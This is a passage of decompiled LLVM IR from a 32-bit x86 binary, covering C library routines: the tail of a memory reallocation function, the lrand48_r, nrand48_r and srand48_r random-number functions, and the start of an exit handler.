  %v3_8057f0d = inttoptr i32 %v2_8057f0d to i32*
  store i32 %v0_8057f0d, i32* %v3_8057f0d, align 4
  %v0_8057f10 = load i32, i32* @edx, align 4
  %v1_8057f10 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057f10 = add i32 %v1_8057f10, 8
  %v3_8057f10 = inttoptr i32 %v2_8057f10 to i32*
  store i32 %v0_8057f10, i32* %v3_8057f10, align 4
  %v0_8057fc8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057fc8

dec_label_pc_8057f18:                             ; preds = %dec_label_pc_8057ee9, %dec_label_pc_8057eda, %dec_label_pc_8057ea2
  %v1_8057f1f = add i32 %stack_var_-40.0, -7
  store i32 %v1_8057f1f, i32* %eax.global-to-local, align 4
  store i32 %v1_8057f1f, i32* %stack_var_-60, align 4
  %v1_8057f23 = call i32 @malloc(i32 %v1_8057f1f)
  store i32 %v1_8057f23, i32* %eax.global-to-local, align 4
  store i32 %v1_8057f23, i32* %edx.global-to-local, align 4
  %v1_8057f2d = icmp eq i32 %v1_8057f23, 0
  br i1 %v1_8057f2d, label %dec_label_pc_80580e9, label %dec_label_pc_8057f35

dec_label_pc_8057f35:                             ; preds = %dec_label_pc_8057f18
  %v1_8057f35 = add i32 %v1_8057f23, -8
  store i32 %v1_8057f35, i32* %ebx.global-to-local, align 4
  %v1_8057f38 = load i32, i32* @esi, align 4
  %v12_8057f38 = icmp eq i32 %v1_8057f35, %v1_8057f38
  %v1_8057f3a = add i32 %v1_8057f23, -4
  %v2_8057f3a = inttoptr i32 %v1_8057f3a to i32*
  %v3_8057f3a = load i32, i32* %v2_8057f3a, align 4
  store i32 %v3_8057f3a, i32* %eax.global-to-local, align 4
  %v1_8057f3d = icmp eq i1 %v12_8057f38, false
  br i1 %v1_8057f3d, label %dec_label_pc_8057f4b, label %dec_label_pc_8057f3f

dec_label_pc_8057f3f:                             ; preds = %dec_label_pc_8057f35
  %v1_8057f3f = and i32 %v3_8057f3a, -4
  store i32 %v1_8057f3f, i32* %eax.global-to-local, align 4
  store i32 %v1_8057e79, i32* %edx.global-to-local, align 4
  %v2_8057f46 = add i32 %v1_8057f3f, %v1_8057e79
  store i32 %v2_8057f46, i32* @ebx, align 4
  br label %dec_label_pc_8057fc8

dec_label_pc_8057f4b:                             ; preds = %dec_label_pc_8057f35
  %v1_8057f4f = add i32 %v1_8057e79, -4
  store i32 %v1_8057f4f, i32* %eax.global-to-local, align 4
  %v2_8057f54 = udiv i32 %v1_8057f4f, 4
  store i32 %v2_8057f54, i32* @ecx, align 4
  %tmp25 = icmp ult i32 %v1_8057f4f, 37
  br i1 %tmp25, label %dec_label_pc_8057f6d, label %dec_label_pc_8057f5c

dec_label_pc_8057f5c:                             ; preds = %dec_label_pc_8057f4b
  store i32 %v1_8057f23, i32* %stack_var_-60, align 4
  %v3_8057f63 = inttoptr i32 %v1_8057f23 to i16*
  %v4_8057f63 = call i32 @memcpy(i16* %v3_8057f63, i32 %tmp7, i32 %v1_8057f4f)
  store i32 %v4_8057f63, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057fb4

dec_label_pc_8057f6d:                             ; preds = %dec_label_pc_8057f4b
  store i32 %tmp7, i32* @esi, align 4
  %v2_8057f74 = load i32, i32* %arg1, align 4
  store i32 %v2_8057f74, i32* %eax.global-to-local, align 4
  %v2_8057f76 = inttoptr i32 %v1_8057f23 to i32*
  store i32 %v2_8057f74, i32* %v2_8057f76, align 4
  %v0_8057f78 = load i32, i32* @esi, align 4
  %v1_8057f78 = add i32 %v0_8057f78, 4
  %v2_8057f78 = inttoptr i32 %v1_8057f78 to i32*
  %v3_8057f78 = load i32, i32* %v2_8057f78, align 4
  store i32 %v3_8057f78, i32* %eax.global-to-local, align 4
  %v1_8057f7b = load i32, i32* %edx.global-to-local, align 4
  %v2_8057f7b = add i32 %v1_8057f7b, 4
  %v3_8057f7b = inttoptr i32 %v2_8057f7b to i32*
  store i32 %v3_8057f78, i32* %v3_8057f7b, align 4
  %v0_8057f7e = load i32, i32* @esi, align 4
  %v1_8057f7e = add i32 %v0_8057f7e, 8
  %v2_8057f7e = inttoptr i32 %v1_8057f7e to i32*
  %v3_8057f7e = load i32, i32* %v2_8057f7e, align 4
  store i32 %v3_8057f7e, i32* %eax.global-to-local, align 4
  %v1_8057f81 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057f81 = add i32 %v1_8057f81, 8
  %v3_8057f81 = inttoptr i32 %v2_8057f81 to i32*
  store i32 %v3_8057f7e, i32* %v3_8057f81, align 4
  %tmp26 = icmp ult i32 %v1_8057f4f, 17
  br i1 %tmp26, label %dec_label_pc_8057fb4, label %dec_label_pc_8057f86

dec_label_pc_8057f86:                             ; preds = %dec_label_pc_8057f6d
  %v0_8057f86 = load i32, i32* @esi, align 4
  %v1_8057f86 = add i32 %v0_8057f86, 12
  %v2_8057f86 = inttoptr i32 %v1_8057f86 to i32*
  %v3_8057f86 = load i32, i32* %v2_8057f86, align 4
  store i32 %v3_8057f86, i32* %eax.global-to-local, align 4
  %v0_8057f89 = load i32, i32* @ecx, align 4
  %v1_8057f8c = load i32, i32* %edx.global-to-local, align 4
  %v2_8057f8c = add i32 %v1_8057f8c, 12
  %v3_8057f8c = inttoptr i32 %v2_8057f8c to i32*
  store i32 %v3_8057f86, i32* %v3_8057f8c, align 4
  %v0_8057f8f = load i32, i32* @esi, align 4
  %v1_8057f8f = add i32 %v0_8057f8f, 16
  %v2_8057f8f = inttoptr i32 %v1_8057f8f to i32*
  %v3_8057f8f = load i32, i32* %v2_8057f8f, align 4
  store i32 %v3_8057f8f, i32* %eax.global-to-local, align 4
  %v1_8057f92 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057f92 = add i32 %v1_8057f92, 16
  %v3_8057f92 = inttoptr i32 %v2_8057f92 to i32*
  store i32 %v3_8057f8f, i32* %v3_8057f92, align 4
  %tmp21 = icmp ult i32 %v0_8057f89, 7
  br i1 %tmp21, label %dec_label_pc_8057fb4, label %dec_label_pc_8057f97

dec_label_pc_8057f97:                             ; preds = %dec_label_pc_8057f86
  %v0_8057f97 = load i32, i32* @esi, align 4
  %v1_8057f97 = add i32 %v0_8057f97, 20
  %v2_8057f97 = inttoptr i32 %v1_8057f97 to i32*
  %v3_8057f97 = load i32, i32* %v2_8057f97, align 4
  store i32 %v3_8057f97, i32* %eax.global-to-local, align 4
  %v0_8057f9a = load i32, i32* @ecx, align 4
  %v1_8057f9d = load i32, i32* %edx.global-to-local, align 4
  %v2_8057f9d = add i32 %v1_8057f9d, 20
  %v3_8057f9d = inttoptr i32 %v2_8057f9d to i32*
  store i32 %v3_8057f97, i32* %v3_8057f9d, align 4
  %v0_8057fa0 = load i32, i32* @esi, align 4
  %v1_8057fa0 = add i32 %v0_8057fa0, 24
  %v2_8057fa0 = inttoptr i32 %v1_8057fa0 to i32*
  %v3_8057fa0 = load i32, i32* %v2_8057fa0, align 4
  store i32 %v3_8057fa0, i32* %eax.global-to-local, align 4
  %v1_8057fa3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057fa3 = add i32 %v1_8057fa3, 24
  %v3_8057fa3 = inttoptr i32 %v2_8057fa3 to i32*
  store i32 %v3_8057fa0, i32* %v3_8057fa3, align 4
  %tmp22 = icmp ult i32 %v0_8057f9a, 9
  br i1 %tmp22, label %dec_label_pc_8057fb4, label %dec_label_pc_8057fa8

dec_label_pc_8057fa8:                             ; preds = %dec_label_pc_8057f97
  %v0_8057fa8 = load i32, i32* @esi, align 4
  %v1_8057fa8 = add i32 %v0_8057fa8, 28
  %v2_8057fa8 = inttoptr i32 %v1_8057fa8 to i32*
  %v3_8057fa8 = load i32, i32* %v2_8057fa8, align 4
  store i32 %v3_8057fa8, i32* %eax.global-to-local, align 4
  %v1_8057fab = load i32, i32* %edx.global-to-local, align 4
  %v2_8057fab = add i32 %v1_8057fab, 28
  %v3_8057fab = inttoptr i32 %v2_8057fab to i32*
  store i32 %v3_8057fa8, i32* %v3_8057fab, align 4
  %v0_8057fae = load i32, i32* @esi, align 4
  %v1_8057fae = add i32 %v0_8057fae, 32
  %v2_8057fae = inttoptr i32 %v1_8057fae to i32*
  %v3_8057fae = load i32, i32* %v2_8057fae, align 4
  store i32 %v3_8057fae, i32* %eax.global-to-local, align 4
  %v1_8057fb1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057fb1 = add i32 %v1_8057fb1, 32
  %v3_8057fb1 = inttoptr i32 %v2_8057fb1 to i32*
  store i32 %v3_8057fae, i32* %v3_8057fb1, align 4
  br label %dec_label_pc_8057fb4

dec_label_pc_8057fb4:                             ; preds = %dec_label_pc_8057f97, %dec_label_pc_8057f86, %dec_label_pc_8057f6d, %dec_label_pc_8057f5c, %dec_label_pc_8057fa8
  %v0_8057fb7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057fb7 = add i32 %v0_8057fb7, 8
  store i32 %v1_8057fb7, i32* @ebx, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8057fbe = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80580e4

dec_label_pc_8057fc8:                             ; preds = %dec_label_pc_8057e89, %dec_label_pc_8057f3f, %dec_label_pc_8057f0d
  %v1_8057fd9 = phi i32 [ %v1_8057e79, %dec_label_pc_8057e89 ], [ %v2_8057f46, %dec_label_pc_8057f3f ], [ %v0_8057fc8.pre, %dec_label_pc_8057f0d ]
  %v5_8057fca = sub i32 %v1_8057fd9, %stack_var_-40.0
  store i32 %v5_8057fca, i32* @ecx, align 4
  %tmp23 = icmp ult i32 %v5_8057fca, 16
  br i1 %tmp23, label %dec_label_pc_8057fd3, label %dec_label_pc_8057fe5

dec_label_pc_8057fd3:                             ; preds = %dec_label_pc_8057fc8
  %v0_8057fd3 = load i32, i32* @edi, align 4
  %v1_8057fd3 = add i32 %v0_8057fd3, 4
  %v2_8057fd3 = inttoptr i32 %v1_8057fd3 to i32*
  %v3_8057fd3 = load i32, i32* %v2_8057fd3, align 4
  %v1_8057fd6 = urem i32 %v3_8057fd3, 2
  %v2_8057fd9 = or i32 %v1_8057fd6, %v1_8057fd9
  store i32 %v2_8057fd9, i32* %eax.global-to-local, align 4
  store i32 %v2_8057fd9, i32* %v2_8057fd3, align 4
  %v0_8057fde = load i32, i32* @edi, align 4
  %v1_8057fde = load i32, i32* @ebx, align 4
  %v2_8057fde = add i32 %v0_8057fde, 4
  %v3_8057fde = add i32 %v2_8057fde, %v1_8057fde
  %v4_8057fde = inttoptr i32 %v3_8057fde to i32*
  %v5_8057fde = load i32, i32* %v4_8057fde, align 4
  %v6_8057fde = or i32 %v5_8057fde, 1
  store i32 %v6_8057fde, i32* %v4_8057fde, align 4
  br label %dec_label_pc_8058015

dec_label_pc_8057fe5:                             ; preds = %dec_label_pc_8057fc8
  store i32 %stack_var_-40.0, i32* %edx.global-to-local, align 4
  %v0_8057fe9 = load i32, i32* @edi, align 4
  %v2_8057fe9 = add i32 %v0_8057fe9, %stack_var_-40.0
  store i32 %v2_8057fe9, i32* %eax.global-to-local, align 4
  %v1_8057fec = add i32 %v0_8057fe9, 4
  %v2_8057fec = inttoptr i32 %v1_8057fec to i32*
  %v3_8057fec = load i32, i32* %v2_8057fec, align 4
  %v1_8057fef = urem i32 %v3_8057fec, 2
  %v5_8057ff2 = or i32 %v1_8057fef, %stack_var_-40.0
  store i32 %v5_8057ff2, i32* %v2_8057fec, align 4
  %v0_8057ffc = load i32, i32* @ecx, align 4
  %v1_8057ffe = or i32 %v0_8057ffc, 1
  store i32 %v1_8057ffe, i32* %edx.global-to-local, align 4
  %v1_8058001 = load i32, i32* %eax.global-to-local, align 4
  %v2_8058001 = add i32 %v1_8058001, 4
  %v3_8058001 = inttoptr i32 %v2_8058001 to i32*
  store i32 %v1_8057ffe, i32* %v3_8058001, align 4
  %v0_8058004 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058004 = load i32, i32* @ecx, align 4
  %v2_8058004 = add i32 %v0_8058004, 4
  %v3_8058004 = add i32 %v2_8058004, %v1_8058004
  %v4_8058004 = inttoptr i32 %v3_8058004 to i32*
  %v5_8058004 = load i32, i32* %v4_8058004, align 4
  %v6_8058004 = or i32 %v5_8058004, 1
  store i32 %v6_8058004, i32* %v4_8058004, align 4
  %v0_8058009 = load i32, i32* %eax.global-to-local, align 4
  %v1_8058009 = add i32 %v0_8058009, 8
  store i32 %v1_8058009, i32* %eax.global-to-local, align 4
  store i32 %v1_8058009, i32* %stack_var_-60, align 4
  %v1_805800d = call i32 @free(i32 %v1_8058009)
  store i32 %v1_805800d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058015

dec_label_pc_8058015:                             ; preds = %dec_label_pc_8057fd3, %dec_label_pc_8057fe5
  %v0_8058015 = load i32, i32* @edi, align 4
  %v1_8058015 = add i32 %v0_8058015, 8
  store i32 %v1_8058015, i32* @ebx, align 4
  br label %dec_label_pc_80580f1

dec_label_pc_805801d:                             ; preds = %dec_label_pc_8057e6d
  store i32 %tmp7, i32* @ecx, align 4
  %v0_8058021 = load i32, i32* @global_var_80679dc.242, align 4
  %v1_8058026 = add i32 %v0_8058021, -1
  store i32 %v1_8058026, i32* %eax.global-to-local, align 4
  %v2_805802b = inttoptr i32 %v1_8057e71 to i32*
  %v3_805802b = load i32, i32* %v2_805802b, align 4
  store i32 %v3_805802b, i32* @ebp, align 4
  %v1_805802e = or i32 %stack_var_-40.0, 4
  store i32 %v1_805802e, i32* %stack_var_-44, align 4
  %v2_8058034 = add i32 %v3_805802b, %v1_8058026
  store i32 %v2_8058034, i32* %edx.global-to-local, align 4
  %v1_8058037 = sub i32 0, %v0_8058021
  store i32 %v1_8058037, i32* %eax.global-to-local, align 4
  %v2_8058039 = add i32 %v2_8058034, %v1_805802e
  %v2_805803c = and i32 %v2_8058039, %v1_8058037
  store i32 %v2_805803c, i32* @esi, align 4
  %v2_8058040 = sub i32 %v2_805803c, %v3_805802b
  store i32 %v2_8058040, i32* @ebx, align 4
  %v15_8058042 = icmp eq i32 %v1_8057e79, %v2_8058040
  br i1 %v15_8058042, label %dec_label_pc_80580ed, label %dec_label_pc_805804c

dec_label_pc_805804c:                             ; preds = %dec_label_pc_805801d
  %v2_8058053 = sub i32 %v1_8057e71, %v3_805802b
  store i32 %v2_8058053, i32* @edi, align 4
  %v2_8058055 = add i32 %v3_805802b, %v1_8057e79
  store i32 %v2_8058055, i32* %eax.global-to-local, align 4
  store i32 %v2_8058053, i32* %stack_var_-60, align 4
  %v6_8058059 = call i32 @mremap(i32 %v2_8058053, i32 %v2_8058055, i32 %v2_805803c, i32 1, i32 %v1_805802e, i32 %v1_8057e79)
  store i32 %v6_8058059, i32* %eax.global-to-local, align 4
  %v10_8058061 = icmp eq i32 %v6_8058059, -1
  br i1 %v10_8058061, label %dec_label_pc_80580a5, label %dec_label_pc_8058066

dec_label_pc_8058066:                             ; preds = %dec_label_pc_805804c
  %v1_8058066 = load i32, i32* @ebp, align 4
  %v2_8058066 = add i32 %v1_8058066, %v6_8058059
  store i32 %v2_8058066, i32* %edx.global-to-local, align 4
  %v0_8058069 = load i32, i32* @ebx, align 4
  %v1_8058069 = or i32 %v0_8058069, 2
  store i32 %v1_8058069, i32* %ebx.global-to-local, align 4
  %v0_805806c = load i32, i32* @esi, align 4
  store i32 %v0_805806c, i32* %eax.global-to-local, align 4
  %v2_805806e = add i32 %v2_8058066, 4
  %v3_805806e = inttoptr i32 %v2_805806e to i32*
  store i32 %v1_8058069, i32* %v3_805806e, align 4
  %v0_8058071 = load i32, i32* %eax.global-to-local, align 4
  %v5_8058071 = sub i32 %v0_8058071, %v1_8057e79
  %v1_8058075 = load i32, i32* @global_var_80679e4.247, align 4
  %v2_8058075 = add i32 %v1_8058075, %v5_8058071
  store i32 %v2_8058075, i32* %eax.global-to-local, align 4
  store i32 %v2_8058075, i32* @global_var_80679e4.247, align 4
  %v1_8058080 = load i32, i32* @global_var_80679f0.248, align 16
  %tmp27 = icmp ugt i32 %v2_8058075, %v1_8058080
  br i1 %tmp27, label %dec_label_pc_8058088, label %dec_label_pc_805808d

dec_label_pc_8058088:                             ; preds = %dec_label_pc_8058066
  store i32 %v2_8058075, i32* @global_var_80679f0.248, align 16
  br label %dec_label_pc_805808d

dec_label_pc_805808d:                             ; preds = %dec_label_pc_8058066, %dec_label_pc_8058088
  %v1_805808d = load i32, i32* @global_var_80679e8.249, align 8
  %v2_805808d = add i32 %v1_805808d, %v2_8058075
  store i32 %v2_805808d, i32* %eax.global-to-local, align 4
  %v1_8058093 = load i32, i32* @global_var_80679f4.250, align 4
  %tmp28 = icmp ugt i32 %v2_805808d, %v1_8058093
  br i1 %tmp28, label %dec_label_pc_805809b, label %dec_label_pc_80580a0

dec_label_pc_805809b:                             ; preds = %dec_label_pc_805808d
  store i32 %v2_805808d, i32* @global_var_80679f4.250, align 4
  br label %dec_label_pc_80580a0

dec_label_pc_80580a0:                             ; preds = %dec_label_pc_805808d, %dec_label_pc_805809b
  %v0_80580a0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80580a0 = add i32 %v0_80580a0, 8
  store i32 %v1_80580a0, i32* @ebx, align 4
  br label %dec_label_pc_80580f1

dec_label_pc_80580a5:                             ; preds = %dec_label_pc_805804c
  %v2_80580a5 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80580a5, i32* %eax.global-to-local, align 4
  %v10_80580a8 = icmp ult i32 %v1_8057e79, %v2_80580a5
  %v1_80580ac = icmp eq i1 %v10_80580a8, false
  br i1 %v1_80580ac, label %dec_label_pc_80580ed, label %dec_label_pc_80580ae

dec_label_pc_80580ae:                             ; preds = %dec_label_pc_80580a5
  %v1_80580b5 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80580b5, i32* %eax.global-to-local, align 4
  store i32 %v1_80580b5, i32* %stack_var_-60, align 4
  %v1_80580b9 = call i32 @malloc(i32 %v1_80580b5)
  store i32 %v1_80580b9, i32* %eax.global-to-local, align 4
  store i32 %v1_80580b9, i32* @ebx, align 4
  %v1_80580c3 = icmp eq i32 %v1_80580b9, 0
  br i1 %v1_80580c3, label %dec_label_pc_80580e9, label %dec_label_pc_80580c7

dec_label_pc_80580c7:                             ; preds = %dec_label_pc_80580ae
  %v1_80580cc = add i32 %v1_8057e79, -8
  store i32 %v1_80580cc, i32* %eax.global-to-local, align 4
  store i32 %v1_80580b9, i32* %stack_var_-60, align 4
  %v3_80580d5 = inttoptr i32 %v1_80580b9 to i16*
  %v4_80580d5 = call i32 @memcpy(i16* %v3_80580d5, i32 %tmp7, i32 %v1_80580cc)
  store i32 %v4_80580d5, i32* %eax.global-to-local, align 4
  store i32 %v1_80580b9, i32* %edx.global-to-local, align 4
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_80580df = call i32 @free(i32 %tmp7)
  br label %dec_label_pc_80580e4

dec_label_pc_80580e4:                             ; preds = %dec_label_pc_8057fb4, %dec_label_pc_80580c7
  %storemerge = phi i32 [ %v1_80580df, %dec_label_pc_80580c7 ], [ %v1_8057fbe, %dec_label_pc_8057fb4 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80580f1

dec_label_pc_80580e9:                             ; preds = %dec_label_pc_80580ae, %dec_label_pc_8057f18
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80580f1

dec_label_pc_80580ed:                             ; preds = %dec_label_pc_80580a5, %dec_label_pc_805801d, %dec_label_pc_8057eb7
  store i32 %tmp7, i32* @ebx, align 4
  br label %dec_label_pc_80580f1

dec_label_pc_80580f1:                             ; preds = %dec_label_pc_80580e9, %dec_label_pc_80580e4, %dec_label_pc_80580a0, %dec_label_pc_8058015, %dec_label_pc_80580ed
  store i32 %v2_8057e26, i32* %eax.global-to-local, align 4
  store i32 %v2_8057e26, i32* %stack_var_-60, align 4
  %v3_80580fa = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_80580fa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80580ff

dec_label_pc_80580ff:                             ; preds = %dec_label_pc_8057e0a, %dec_label_pc_8057df6, %dec_label_pc_80580f1
  br label %dec_label_pc_8058102

dec_label_pc_8058102:                             ; preds = %dec_label_pc_8057e44, %dec_label_pc_80580ff
  %v0_8058105 = load i32, i32* @ebx, align 4
  store i32 %v0_8058105, i32* %eax.global-to-local, align 4
  store i32 %v0_8057de7, i32* @ebx, align 4
  store i32 %v0_8057de6, i32* @esi, align 4
  store i32 %v0_8057de5, i32* @edi, align 4
  store i32 %v0_8057de4, i32* @ebp, align 4
  ret i32 %v0_8058105

; uselistorder directives
  uselistorder i32 %v1_80580b9, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_805808d, { 1, 0, 2 }
  uselistorder i32 %v2_8058075, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v6_8058059, { 1, 0, 2 }
  uselistorder i32 %v2_8058053, { 1, 0, 2 }
  uselistorder i32 %v1_805802e, { 1, 0, 2 }
  uselistorder i32 %v3_805802b, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8057fe9, { 1, 0 }
  uselistorder i32 %v1_8057f4f, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_8057f23, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_8057ec7, { 1, 0, 2 }
  uselistorder i32 %v3_8057eda, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8057e97, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8057e79, { 13, 14, 12, 15, 1, 0, 7, 11, 2, 10, 3, 4, 5, 6, 9, 8, 16 }
  uselistorder i32 %v1_8057e71, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 13, 4, 0, 1, 9, 10, 8, 7, 2, 5, 3, 6, 12, 11 }
  uselistorder i32 %v1_8057e66, { 1, 0 }
  uselistorder i32 %v1_8057e56, { 0, 2, 1 }
  uselistorder i32 %v0_8057e3f, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 13, 12, 11, 1, 10, 9, 8, 7, 2, 0, 6, 5, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 6, 15, 16, 17, 18, 19 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 42, 40, 43, 44, 45, 46, 0, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 ()* @abort, { 4, 0, 1, 2, 3 }
  uselistorder i32 -2, { 22, 3, 7, 0, 19, 20, 2, 18, 24, 23, 4, 6, 5, 30, 1, 8, 9, 10, 21, 25, 26, 27, 28, 29, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* @global_var_80676ac.237, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8062910.167 to i32), { 4, 11, 0, 5, 1, 6, 2, 7, 12, 3, 8, 9, 10 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8058102, { 1, 0 }
  uselistorder label %dec_label_pc_80580ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80580f1, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80580e4, { 1, 0 }
  uselistorder label %dec_label_pc_80580a0, { 1, 0 }
  uselistorder label %dec_label_pc_805808d, { 1, 0 }
  uselistorder label %dec_label_pc_8058015, { 1, 0 }
  uselistorder label %dec_label_pc_8057fc8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057fb4, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8057f0d, { 1, 0 }
  uselistorder label %dec_label_pc_8057e6d, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_8058119 = inttoptr i32 %arg2 to i32*
  %v4_8058119 = call i32 @nrand48_r(i32 %arg1, i32 %arg1, i32* %v3_8058119)
  ret i32 %v4_8058119
}

define i32 @nrand48_r(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8058124 = load i32, i32* @ebx, align 4
  store i32 %v0_8058124, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8058131 = inttoptr i32 %arg1 to i16*
  %v3_8058131 = call i32 @__drand48_iterate(i16* %v2_8058131, i32 %arg2)
  %v2_805813c = icmp slt i32 %v3_8058131, 0
  br i1 %v2_805813c, label %dec_label_pc_805815b, label %dec_label_pc_8058140

dec_label_pc_8058140:                             ; preds = %entry
  %v0_8058140 = load i32, i32* @ebx, align 4
  %v1_8058140 = add i32 %v0_8058140, 4
  %v2_8058140 = inttoptr i32 %v1_8058140 to i16*
  %v3_8058140 = load i16, i16* %v2_8058140, align 2
  %v4_8058140 = zext i16 %v3_8058140 to i32
  %v2_8058144 = mul nuw i32 %v4_8058140, 32768
  %v1_8058147 = add i32 %v0_8058140, 2
  %v2_8058147 = inttoptr i32 %v1_8058147 to i16*
  %v3_8058147 = load i16, i16* %v2_8058147, align 2
  %v3_805814b = udiv i16 %v3_8058147, 2
  %v9_805814b = zext i16 %v3_805814b to i32
  %v2_8058151 = or i32 %v9_805814b, %v2_8058144
  store i32 %v2_8058151, i32* %arg3, align 4
  br label %dec_label_pc_805815b

dec_label_pc_805815b:                             ; preds = %entry, %dec_label_pc_8058140
  %v0_805815b = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8058140 ]
  %v2_805815f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805815f, i32* @ebx, align 4
  ret i32 %v0_805815b

; uselistorder directives
  uselistorder i32 32768, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805815b, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v4_8058164 = sext i16 %arg1 to i32
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_805816e = sdiv i32 %v4_8058164, 65536
  store i32 %v2_805816e, i32* @ecx, align 4
  %v3_8058171 = add i32 %arg2, 2
  %v4_8058171 = inttoptr i32 %v3_8058171 to i16*
  store i16 %arg1, i16* %v4_8058171, align 2
  %v0_8058177 = load i32, i32* @ecx, align 4
  %v1_8058177 = trunc i32 %v0_8058177 to i16
  %v2_8058177 = load i32, i32* %edx.global-to-local, align 4
  %v3_8058177 = add i32 %v2_8058177, 4
  %v4_8058177 = inttoptr i32 %v3_8058177 to i16*
  store i16 %v1_8058177, i16* %v4_8058177, align 2
  %v0_805817b = load i32, i32* %edx.global-to-local, align 4
  %v1_805817b = inttoptr i32 %v0_805817b to i16*
  store i16 13070, i16* %v1_805817b, align 2
  %v0_8058180 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058180 = add i32 %v0_8058180, 16
  %v2_8058180 = inttoptr i32 %v1_8058180 to i32*
  store i32 -554899859, i32* %v2_8058180, align 4
  %v0_8058187 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058187 = add i32 %v0_8058187, 20
  %v2_8058187 = inttoptr i32 %v1_8058187 to i32*
  store i32 5, i32* %v2_8058187, align 4
  %v0_805818e = load i32, i32* %edx.global-to-local, align 4
  %v1_805818e = add i32 %v0_805818e, 12
  %v2_805818e = inttoptr i32 %v1_805818e to i16*
  store i16 11, i16* %v2_805818e, align 2
  %v0_8058194 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058194 = add i32 %v0_8058194, 14
  %v2_8058194 = inttoptr i32 %v1_8058194 to i16*
  store i16 1, i16* %v2_8058194, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805819c = load i32, i32* @ebx, align 4
  store i32 %v0_805819c, i32* %stack_var_-4, align 4
  %v0_80581e11724 = load i32, i32* @global_var_80673fc.329, align 4
  %v0_80581e61825 = load i32, i32* @global_var_8067400.331, align 1024
  %v1_80581ec1926 = icmp eq i32 %v0_80581e11724, 0
  %v1_80581ee2027 = icmp eq i1 %v1_80581ec1926, false
  br i1 %v1_80581ee2027, label %dec_label_pc_80581a6.lr.ph, label %dec_label_pc_80581f0

dec_label_pc_80581a6:                             ; preds = %dec_label_pc_80581a6.lr.ph, %dec_label_pc_80581e1.backedge
  %v0_80581e121 = phi i32 [ %v0_80581e11729, %dec_label_pc_80581a6.lr.ph ], [ %v1_80581a6, %dec_label_pc_80581e1.backedge ]
  %v1_80581a6 = add i32 %v0_80581e121, -1
  store i32 %v1_80581a6, i32* @global_var_80673fc.329, align 4
  %v2_80581ac = mul i32 %v1_80581a6, 16
  %v2_80581af = add i32 %v0_80581e61830, %v2_80581ac
  %v1_80581b2 = inttoptr i32 %v2_80581af to i32*
  %v2_80581b2 = load i32, i32* %v1_80581b2, align 4
  %v9_80581b4 = icmp eq i32 %v2_80581b2, 2
  br i1 %v9_80581b4, label %dec_label_pc_80581c0, label %dec_label_pc_80581b9

dec_label_pc_80581b9:                             ; preds = %dec_label_pc_80581a6
  %v9_80581b9 = icmp eq i32 %v2_80581b2, 3
  %v1_80581bc = icmp eq i1 %v9_80581b9, false
